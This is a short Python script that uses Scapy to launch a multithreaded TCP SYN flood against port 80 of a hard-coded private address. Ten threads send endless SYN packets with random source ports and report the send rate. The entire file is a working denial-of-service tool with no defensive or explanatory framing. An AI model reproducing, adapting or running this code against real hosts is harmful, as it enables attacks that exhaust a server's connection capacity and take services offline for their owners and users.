from scapy.all import *
from scapy.layers.inet import IP, TCP
import time


class Flooder(threading.Thread):
    def __init__(self, source, target, port, interface, id):
        threading.Thread.__init__(self)
        self.source = source
        self.target = target
        self.port = port
        self.interface = interface
        self.id = id

    def run(self):
        i = 0
        print("Thread {} started".format(self.id))
        ip_data = IP(src=self.source, dst=self.target)
        time_start = time.time()
        while True:
            src_port = RandNum(1024, 65535)
            syn = TCP(sport=src_port, dport=self.port, flags="S")
            send(ip_data / syn, verbose=False, iface=self.interface)
            i += 1
            if i % 1000 == 0:
                print("Thread {} sent {} packets, speed: {} pkts".format(self.id, i, 1000/(time.time()-time_start)))
                time_start = time.time()


def syn_flood(source, target, port, interface, threads):
    for i in range(threads):
        t = Flooder(source, target, port, interface, i)
        t.daemon = True
        t.start()
    while True:
        time.sleep(100)


def main():
    # print(ifaces)
    target = "192.168.0.228"
    source = "192.168.0.107"
    port = 80
    threads = 10
    interface = "enp3s0"
    syn_flood(source, target, port, interface, threads)


if __name__ == "__main__":
    main()
